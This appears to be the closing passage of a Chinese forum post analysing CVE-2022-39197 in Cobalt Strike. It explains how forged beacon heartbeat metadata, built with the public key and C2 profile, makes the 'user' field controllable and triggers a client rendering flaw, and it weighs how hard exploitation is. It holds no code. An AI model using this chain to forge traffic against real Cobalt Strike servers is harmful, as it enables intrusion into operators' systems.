这里的user参数可控，结合cs aggressor端界面渲染相关的漏洞，从而造成了这个cve，那这个user参数是哪来的呢，还是[cs流量分析](https://forum.butian.net/share/1861) 此文中提到的第七步（这里面就是cs里面传元数据），这个流量是可以伪造的，只要知道公钥和C2profile，通过伪造心跳上线的元数据流量，user字段是在元数据里面的，从而user就可控了，最终串一起就造成了《Cobalt Strike 远程代码执行漏洞 (CVE-2022-39197)》。

这里简单分析下要做到伪造心跳流量的难度：

核心就是公钥和c2profile，c2profile决定了明文心跳流量如何伪造，公钥是用来加密伪造好的流量。攻击者获取公钥和c2profile的途径只能是从样本分析中提取出来，但是cs的样本在内存里面是有一个反分析手段的，所以这个还是不简单的，但是你要是使用默认配置的c2profile，那就没啥好说的了。

所以在笔者看来这个漏洞的利用条件是比较高的，cs官方给出的意见是《升级至 Cobalt Strike 4.7.1或更高版本》，哈哈哈。要不是这个洞是个中国人发现的，我都怀疑是cs自己的py操作。

笔者才疏学浅，若文中存在错误观点，欢迎斧正。